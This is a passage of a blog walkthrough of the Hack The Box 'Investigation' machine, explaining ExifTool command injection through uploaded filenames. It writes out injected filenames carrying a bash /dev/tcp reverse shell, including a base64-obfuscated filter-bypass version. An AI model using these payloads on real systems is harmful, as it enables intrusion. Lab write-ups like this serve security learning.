@@ -1,0 +1,767 @@
+<!doctype html><html lang=en><head><script async src="https://www.googletagmanager.com/gtag/js?id=G-EQK3ZBE0XH"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-EQK3ZBE0XH")</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>Investigation HTB Walkthrough - emdwyer</title><meta name=Description content="emdwyer's personal site - development, infosec, security"><meta property="og:title" content="Investigation HTB Walkthrough"><meta property="og:description" content="Introduction For this machine, we identify a web app using ExifTool to show metadata for images uploaded via a form. Knowing the version of ExifTool used contains a CVE, we are able to command inject into the form and base64 encode/decode an obfuscated reverse shell to gain a foothold. From here, we find an email containing an event viewer log we must search through. We uncover a credential leak where a failed logon attempt shows the user accidentally entered their username in the password field, giving us credentials to SSH into the machine as a real user."><meta property="og:type" content="article"><meta property="og:url" content="https://emdwyer.github.io/2023-04-22-investigation-htb/"><meta property="og:image" content="https://emdwyer.github.io/logo.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-04-22T00:00:00+10:00"><meta property="article:modified_time" content="2023-04-22T14:40:06+10:00"><meta property="og:site_name" content="emdwyer"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://emdwyer.github.io/logo.png"><meta name=twitter:title content="Investigation HTB Walkthrough"><meta name=twitter:description content="Introduction For this machine, we identify a web app using ExifTool to show metadata for images uploaded via a form. Knowing the version of ExifTool used contains a CVE, we are able to command inject into the form and base64 encode/decode an obfuscated reverse shell to gain a foothold. From here, we find an email containing an event viewer log we must search through. We uncover a credential leak where a failed logon attempt shows the user accidentally entered their username in the password field, giving us credentials to SSH into the machine as a real user."><meta name=application-name content="emdwyer"><meta name=apple-mobile-web-app-title content="emdwyer"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://emdwyer.github.io/2023-04-22-investigation-htb/><link rel=prev href=https://emdwyer.github.io/2023-04-15-encoding-htb/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"Investigation HTB Walkthrough","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/emdwyer.github.io\/2023-04-22-investigation-htb\/"},"image":["https:\/\/emdwyer.github.io\/images\/Apple-Devices-Preview.png"],"genre":"posts","keywords":"htb, security, penetration testing, forensics, reversing, injection, disassembly","wordcount":4042,"url":"https:\/\/emdwyer.github.io\/2023-04-22-investigation-htb\/","datePublished":"2023-04-22T00:00:00+10:00","dateModified":"2023-04-22T14:40:06+10:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"emdwyer","logo":"https:\/\/emdwyer.github.io\/avatar.jpg"},"author":{"@type":"Person","name":"emdwyer"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/>About </a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=emdwyer><span class=header-title-pre><i class='far fa-solid fa-terminal' aria-hidden=true></i></span>emdwyer</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title>About</a><a class=menu-item href=https://github.com/m-dwyer title=GitHub rel="noopener noreffer" target=_blank><i class='fab fa-github fa-fw' aria-hidden=true></i></a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Investigation HTB Walkthrough</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>emdwyer</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-04-22>2023-04-22</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;4042 words&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;19 minutes&nbsp;<span id=/2023-04-22-investigation-htb/ class=leancloud_visitors data-flag-title="Investigation HTB Walkthrough">
+<i class="far fa-eye fa-fw" aria-hidden=true></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+</span>&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#enumeration>Enumeration</a></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></div><div class=content id=content><p><img class=lazyload src=/svg/loading.min.svg data-src=./investigation.png data-srcset="./investigation.png, ./investigation.png 1.5x, ./investigation.png 2x" data-sizes=auto alt=./investigation.png title=Investigation></p><h2 id=introduction>Introduction</h2><p>For this machine, we identify a web app using ExifTool to show metadata for images uploaded via a form. Knowing the version of ExifTool used contains a CVE, we are able to command inject into the form and base64 encode/decode an obfuscated reverse shell to gain a foothold. From here, we find an email containing an event viewer log we must search through. We uncover a credential leak where a failed logon attempt shows the user accidentally entered their username in the password field, giving us credentials to SSH into the machine as a real user. Next, <code>sudo</code> indicates a 64-bit ELF binary we are able to run as root. After copying and disassembling this binary in order to understand its behaviour, we are able to exploit that behaviour to spawn a root shell on the target and get the root flag.</p><h2 id=enumeration>Enumeration</h2><p>Let&rsquo;s start with an nmap scan:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nmap</span> -sC -sV -o nmap/initial 10.10.11.197
+</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-02-10 20:09 AEDT
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.197
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.020s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>998</span> closed tcp ports <span class=o>(</span>conn-refused<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 2f1e6306aa6ebbcc0d19d4152674c6d9 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 274520add2faa73a8373d97c79abf30b <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 4245eb916e21020617b2748bc5834fe0 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.41
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to http://eforenzics.htb/
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.41 <span class=o>(</span>Ubuntu<span class=o>)</span>
+</span></span><span class=line><span class=cl>Service Info: Host: eforenzics.htb<span class=p>;</span> OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 8.69 seconds
+</span></span></code></pre></td></tr></table></div></div><p>We add <code>10.10.11.197 eforenzics.htb</code> to our <code>/etc/hosts</code> and get the following page when browsing to this domain:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-02-10-20-11-40-image.png data-srcset="./assets/2023-02-10-20-11-40-image.png, ./assets/2023-02-10-20-11-40-image.png 1.5x, ./assets/2023-02-10-20-11-40-image.png 2x" data-sizes=auto alt=./assets/2023-02-10-20-11-40-image.png title=landing></p><p>Clicking &lsquo;Go!&rsquo; takes us to an upload form:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-02-10-20-16-31-image.png data-srcset="./assets/2023-02-10-20-16-31-image.png, ./assets/2023-02-10-20-16-31-image.png 1.5x, ./assets/2023-02-10-20-16-31-image.png 2x" data-sizes=auto alt=./assets/2023-02-10-20-16-31-image.png title=upload></p><p>The obvious thing to do is upload this photo of a black cat (..obviously.. what else?), and capture the request in Burp Suite (binary content removed because space..):</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-02-10-20-17-20-image.png data-srcset="./assets/2023-02-10-20-17-20-image.png, ./assets/2023-02-10-20-17-20-image.png 1.5x, ./assets/2023-02-10-20-17-20-image.png 2x" data-sizes=auto alt=./assets/2023-02-10-20-17-20-image.png title=cat></p><p>The captured request:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /upload.php HTTP/1.1
+</span></span><span class=line><span class=cl>Host: eforenzics.htb
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Referer: http://eforenzics.htb/service.html
+</span></span><span class=line><span class=cl>Content-Type: multipart/form-data; boundary=---------------------------351195817916335259373921502099
+</span></span><span class=line><span class=cl>Content-Length: 164057
+</span></span><span class=line><span class=cl>Origin: http://eforenzics.htb
+</span></span><span class=line><span class=cl>DNT: 1
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-----------------------------351195817916335259373921502099
+</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;image&#34;; filename=&#34;black_cat.jpg&#34;
+</span></span><span class=line><span class=cl>Content-Type: image/jpeg
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>ÿØÿà JFIF quests: 1
+</span></span></code></pre></td></tr></table></div></div><p>We are taken to a page with a hyperlink to download a report on our analysed file:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-02-10-20-29-09-image.png data-srcset="./assets/2023-02-10-20-29-09-image.png, ./assets/2023-02-10-20-29-09-image.png 1.5x, ./assets/2023-02-10-20-29-09-image.png 2x" data-sizes=auto alt=./assets/2023-02-10-20-29-09-image.png title=./assets/2023-02-10-20-29-09-image.png></p><p>We click the <code>here</code> link shown above:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>GET /analysed_images/blackcatjpg.txt HTTP/1.1
+</span></span><span class=line><span class=cl>Host: eforenzics.htb
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Referer: http://eforenzics.htb/upload.php
+</span></span><span class=line><span class=cl>DNT: 1
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span></code></pre></td></tr></table></div></div><p>This file response contains:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ExifTool Version Number         : 12.37
+</span></span><span class=line><span class=cl>File Name                       : black_cat.jpg
+</span></span><span class=line><span class=cl>Directory                       : .
+</span></span><span class=line><span class=cl>File Size                       : 160 KiB
+</span></span><span class=line><span class=cl>File Modification Date/Time     : 2023:02:10 09:14:44+00:00
+</span></span><span class=line><span class=cl>File Access Date/Time           : 2023:02:10 09:14:44+00:00
+</span></span><span class=line><span class=cl>File Inode Change Date/Time     : 2023:02:10 09:14:44+00:00
+</span></span><span class=line><span class=cl>File Permissions                : -rw-r--r--
+</span></span><span class=line><span class=cl>File Type                       : JPEG
+</span></span><span class=line><span class=cl>File Type Extension             : jpg
+</span></span><span class=line><span class=cl>MIME Type                       : image/jpeg
+</span></span><span class=line><span class=cl>JFIF Version                    : 1.01
+</span></span><span class=line><span class=cl>Resolution Unit                 : inches
+</span></span><span class=line><span class=cl>X Resolution                    : 300
+</span></span><span class=line><span class=cl>Y Resolution                    : 300
+</span></span><span class=line><span class=cl>Image Width                     : 800
+</span></span><span class=line><span class=cl>Image Height                    : 533
+</span></span><span class=line><span class=cl>Encoding Process                : Baseline DCT, Huffman coding
+</span></span><span class=line><span class=cl>Bits Per Sample                 : 8
+</span></span><span class=line><span class=cl>Color Components                : 3
+</span></span><span class=line><span class=cl>Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+</span></span><span class=line><span class=cl>Image Size                      : 800x533
+</span></span><span class=line><span class=cl>Megapixels                      : 0.426
+</span></span></code></pre></td></tr></table></div></div><p>So, the app likelly shells out to <a href=https://exiftool.org/ target=_blank rel="noopener noreffer">ExifTool</a>, which is a perl-based library and command line app for reading, writing and editing meta information across image formats.</p><p>To speed things up and avoid binary noise of a larger file, let&rsquo;s resize our black cat image to an ultra ultra high definition resolution of 16x10:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$convert</span> black_cat.jpg -resize 16x10 black_cat_sm.jpg
+</span></span></code></pre></td></tr></table></div></div><p>Searching for ExifTool 12.37, the first thing I came across was <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-23935" target=_blank rel="noopener noreffer">CVE-2022-23935</a>, a command injection vulnerability.</p><p>Reading a little more thoroughly to try and understand the CVE, the problematic line in ExifTool appears to be:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-perl data-lang=perl><span class=line><span class=cl><span class=nv>$mode</span> <span class=o>=</span> <span class=p>(</span><span class=nv>$file</span> <span class=o>=~</span><span class=sr> /\|$/</span> <span class=p>?</span> <span class=s>&#39;&#39;</span> <span class=p>:</span> <span class=s>&#39;&lt;&#39;</span><span class=p>)</span> <span class=k>unless</span> <span class=nv>$mode</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=c1># snip</span>
+</span></span><span class=line><span class=cl><span class=k>return</span> <span class=nb>open</span> <span class=nv>$fh</span><span class=p>,</span> <span class=s>&#34;$mode$file&#34;</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p>This will, using regex, check if the filename ends in a pipe (<code>|</code>). Under normal circumstances, this would <strong>not</strong> be the case, so we would open a file descriptor with <code>&lt; file</code>, i.e. piping the file contents into an open file descriptor for reading.</p><p>However, if the file <strong>does</strong> end in a pipe, the mode is an empty string, and we open a file descriptor and pass argument <code>$file</code>. The documentation for <a href=https://perldoc.perl.org/functions/open target=_blank rel="noopener noreffer">open</a> in perl states:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Instead of a filename, you may specify an external command (plus an optional argument list) or a scalar reference, in order to open filehandles on commands or in-memory scalars, respectively.
+</span></span></code></pre></td></tr></table></div></div><p>So, we can specify an external command here, as long as it ends in a pipe. Sounds fun. Let&rsquo;s try out <code>sleep 20</code> in our form&rsquo;s <code>filename</code> data field, and see if the web server hangs:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>POST /upload.php HTTP/1.1
+</span></span><span class=line><span class=cl>Host: eforenzics.htb
+</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
+</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+</span></span><span class=line><span class=cl>Accept-Language: en-US,en;q=0.5
+</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
+</span></span><span class=line><span class=cl>Referer: http://eforenzics.htb/service.html
+</span></span><span class=line><span class=cl>Content-Type: multipart/form-data; boundary=---------------------------28894344611500965082477156362
+</span></span><span class=line><span class=cl>Content-Length: 743
+</span></span><span class=line><span class=cl>Origin: http://eforenzics.htb
+</span></span><span class=line><span class=cl>DNT: 1
+</span></span><span class=line><span class=cl>Connection: close
+</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-----------------------------28894344611500965082477156362
+</span></span><span class=line><span class=cl>Content-Disposition: form-data; name=&#34;image&#34;; filename=&#34;sleep 20 |&#34;
+</span></span><span class=line><span class=cl>Content-Type: image/jpeg
+</span></span></code></pre></td></tr></table></div></div><p>Sure enough, the web server hangs for a good 20 seconds, suggesting we have command injection. When trying a typical reverse shell like so:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>filename=&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.33/3322 0&gt;&amp;1 |&#34;
+</span></span></code></pre></td></tr></table></div></div><p>I noticed the web server response was giving me a link to <a href=http://eforenzics.htb/analysed_images/332201.txt target=_blank rel="noopener noreffer">http://eforenzics.htb/analysed_images/332201.txt</a> (refer to the port and file descriptors above), so it appeared to be escaping & removing slashes and other characters &ndash; thwarted!.. for now.</p><p>Looking at <a href=https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions target=_blank rel="noopener noreffer">bypass-bash-restrictions</a> on HackTricks, I found a neat base64 trick and came up with:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$echo</span> <span class=s2>&#34;echo </span><span class=k>$(</span><span class=nb>echo</span> <span class=s1>&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.33/3322 0&gt;&amp;1&#39;</span> <span class=p>|</span> base64 <span class=p>|</span> base64<span class=k>)</span><span class=s2>|ba&#39;&#39;se&#39;&#39;6&#39;&#39;4 -&#39;&#39;d|ba&#39;&#39;se&#39;&#39;64 -&#39;&#39;d|b&#39;&#39;a&#39;&#39;s&#39;&#39;h&#34;</span> <span class=p>|</span> sed <span class=s1>&#39;s/ /${IFS}/g&#39;</span>
+</span></span><span class=line><span class=cl>echo<span class=si>${</span><span class=nv>IFS</span><span class=si>}</span>WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0ek15OHpNekl5SURBK0pqRUsK<span class=p>|</span>ba<span class=s1>&#39;&#39;</span>se<span class=s1>&#39;&#39;</span>6<span class=s1>&#39;&#39;</span>4<span class=si>${</span><span class=nv>IFS</span><span class=si>}</span>-<span class=s1>&#39;&#39;</span>d<span class=p>|</span>ba<span class=s1>&#39;&#39;</span>se<span class=s1>&#39;&#39;</span>64<span class=si>${</span><span class=nv>IFS</span><span class=si>}</span>-<span class=s1>&#39;&#39;</span>d<span class=p>|</span>b<span class=s1>&#39;&#39;</span>a<span class=s1>&#39;&#39;</span>s<span class=s1>&#39;&#39;</span>h
+</span></span></code></pre></td></tr></table></div></div><p>What does this do exactly? It echoes our shell code into <code>base64</code> to encode it&mldr; TWICE.. then creates a string that takes our double-encoded base64 string, piping it to <code>base64 -d</code> twice to decode the string, but the <code>base64 -d</code> command is (somewhat) obfuscated with single quotes <code>'</code>. Basically it&rsquo;s &ldquo;let&rsquo;s do a whole bunch of obfuscating nothings to land on our original string in order to bypass common filtering techniques&rdquo;.</p><p>I tried the above in our file submission query in Burp Suite:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>filename=&#34;echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0ek15OHpNekl5SURBK0pqRUsK|ba&#39;&#39;se&#39;&#39;6&#39;&#39;4${IFS}-&#39;&#39;d|ba&#39;&#39;se&#39;&#39;64${IFS}-&#39;&#39;d|b&#39;&#39;a&#39;&#39;s&#39;&#39;h |&#34;
+</span></span></code></pre></td></tr></table></div></div><p>Oh, and <code>${IFS}</code> is the Internal Field Seperator environment variable. Used by bash for delimiting spaces in strings.</p><p>Yay, we get a reverse shell as the <code>www-data</code> user!!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>3322</span> ...
+</span></span><span class=line><span class=cl>ls -al
+</span></span><span class=line><span class=cl>^Tconnect to <span class=o>[</span>10.10.14.33<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.197<span class=o>]</span> <span class=m>58426</span>
+</span></span><span class=line><span class=cl>bash: cannot <span class=nb>set</span> terminal process group <span class=o>(</span>956<span class=o>)</span>: Inappropriate ioctl <span class=k>for</span> device
+</span></span><span class=line><span class=cl>bash: no job control in this shell
+</span></span><span class=line><span class=cl>www-data@investigation:~/uploads/1676025012$ id
+</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>33<span class=o>(</span>www-data<span class=o>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s list out the users with a valid shell:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
